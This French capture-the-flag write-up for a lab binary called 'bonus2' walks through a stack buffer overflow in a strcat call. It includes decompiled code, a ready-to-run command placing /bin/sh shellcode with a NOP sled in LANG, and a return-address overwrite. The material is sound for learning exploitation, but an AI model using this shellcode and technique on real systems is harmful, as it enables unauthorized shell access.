# Readme: Exploitation de bonus2

## Configuration initiale
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
```
- Pas de protection RELRO
- Pas de canary sur la pile
- NX désactivé (la pile est exécutable)
- Pas de PIE (les adresses sont prévisibles)

## Code décompilé

```c
int greetuser(char *user)
{
  char greeting[64];
  
  switch (language)
  {
    case 1:
      strcpy(greeting, "Hyvää päivää ");
      break;
    case 2:
      strcpy(greeting, "Goedemiddag! ");
      break;
    default:
      strcpy(greeting, "Hello ");
  }
  
  strcat(greeting, user);
  return puts(greeting);
}

int main(int argc, char **argv)
{
  char *lang;
  char dest[76];
  
  if (argc != 3)
    return 1;
  
  memset(dest, 0, sizeof(dest));
  strncpy(dest, argv[1], 40);
  strncpy(dest + 40, argv[2], 32);
  
  lang = getenv("LANG");
  if (lang)
  {
    if (memcmp(lang, "fi", 2) == 0)
      language = 1;
    else if (memcmp(lang, "nl", 2) == 0)
      language = 2;
  }
  
  greetuser(dest);
  return 0;
}
```

## Analyse du code

1. `main` prend deux arguments et les copie dans `dest`:
   - Premier argument: jusqu'à 40 caractères
   - Deuxième argument: jusqu'à 32 caractères

2. La variable d'environnement `LANG` est vérifiée pour définir `language`:
   - "fi" pour finnois (1)
   - "nl" pour néerlandais (2)
   - Par défaut (0)

3. `greetuser` utilise un buffer de 64 octets pour le message de salutation.

4. La vulnérabilité se trouve dans `strcat(greeting, user)` dans `greetuser`:
   - `greeting` peut contenir jusqu'à 64 octets
   - `user` peut contenir jusqu'à 72 octets (40 + 32 du `main`)
   - Cela peut provoquer un débordement de tampon

## Stratégie d'exploitation révisée

1. Utiliser la variable d'environnement `LANG` pour stocker notre shellcode.
2. Définir `LANG` pour commencer par "fi" afin de déclencher le cas finnois dans `greetuser`.
3. Remplir le premier argument avec 40 caractères.
4. Utiliser le second argument pour écraser l'adresse de retour et la faire pointer vers notre shellcode dans `LANG`.

## Commande d'exploitation corrigée

```bash
export LANG=$(python -c 'print "fi" + "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xc9\xfe\xff\xbf"')
```

## Explication détaillée

1. Configuration de LANG :
   - Commence par "fi" pour déclencher le cas finnois.
   - Suivi d'un NOP sled de 100 octets (\x90).
   - Se termine par le shellcode qui exécute /bin/sh.

2. Premier argument :
   - 40 "A" pour remplir complètement la première partie du buffer dans `main`.

3. Deuxième argument :
   - 18 "B" pour le padding.
   - Adresse de retour (\xc9\xfe\xff\xbf) qui pointe vers le NOP sled dans LANG.

4. Fonctionnement :
   - Le buffer dans `greetuser` est rempli avec "Hyvää päivää " (15 caractères) + 40 "A" + 18 "B".
   - L'adresse de retour est écrasée pour pointer vers le NOP sled dans LANG.
   - Lors du retour, l'exécution "glisse" le long du NOP sled jusqu'au shellcode.

5. Trouver l'adresse correcte :
   - Utilisez `gdb` pour examiner l'adresse de LANG : `x/s *((char **)environ)`
   - Ajustez l'adresse pour pointer vers le milieu du NOP sled.

Cette méthode est plus robuste car :
- Elle utilise la variable d'environnement pour stocker un grand shellcode.
- Le NOP sled augmente les chances de succès même si l'adresse varie légèrement.
- Elle contourne les limitations de taille dans les arguments du programme.

N'oubliez pas que l'adresse exacte peut varier selon l'environnement, nécessitant parfois de petits ajustements.